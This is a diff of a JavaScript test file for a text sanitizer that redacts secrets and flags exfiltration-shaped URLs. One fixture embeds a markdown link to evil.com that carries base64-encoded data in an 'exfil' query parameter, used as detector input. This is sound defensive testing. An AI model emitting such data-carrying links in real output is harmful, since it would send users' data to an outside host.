@@ -18,6 +18,7 @@ import {
   isWalkableContainer,
   MAX_DEPTH,
   FILTER_WARNING,
+  REDACTION_DOCTRINE,
 } from "../src/output.mjs";
 import { cp } from "./test-helpers.mjs";
 
@@ -119,7 +120,9 @@ describe("sanitizeText Layer 4 exact warning/error text", () => {
     const r = await sanitizeText("dirty", {
       redact: () => ({ text: "clean", found: ["api-key"] }),
     });
-    assert.deepEqual(r.warnings, ["API keys/secrets redacted: api-key"]);
+    assert.deepEqual(r.warnings, [
+      `API keys/secrets redacted: api-key${REDACTION_DOCTRINE}`,
+    ]);
   });
 
   it("fail-closed error carries 'Failing closed' text AND the original cause", async () => {
@@ -152,7 +155,9 @@ describe("sanitizeText Layer 5 re-vet exact warning/error text", () => {
       filterInjection: () => ({ removeSpans: ["XXX"] }),
     });
     assert.equal(r.cleaned, "key: sk-live-[REDACTED] end");
-    assert.deepEqual(r.warnings, ["API keys/secrets redacted: api-key"]);
+    assert.deepEqual(r.warnings, [
+      `API keys/secrets redacted: api-key${REDACTION_DOCTRINE}`,
+    ]);
   });
 
   it("re-vet fail-closed error carries 'Failing closed' text AND the re-scan cause", async () => {
@@ -250,12 +255,14 @@ describe("sanitizeText Layer 2/3 branch gating", () => {
       `see [c](https://evil.com/p?exfil=${b64}) end`,
       { exfilScan: true },
     );
+    // A markdown link is note-severity (see the exfil tier in output.mjs); the
+    // templates being pinned here are the same either way.
     assert.ok(
-      r.warnings.some((w) =>
-        /URLs shaped like data exfiltration detected/.test(w),
+      r.notes.some((n) =>
+        /URLs shaped like data exfiltration detected/.test(n),
       ),
     );
-    assert.ok(r.warnings.some((w) => /link to evil\.com/.test(w)));
+    assert.ok(r.notes.some((n) => /link to evil\.com/.test(n)));
   });
 });
 
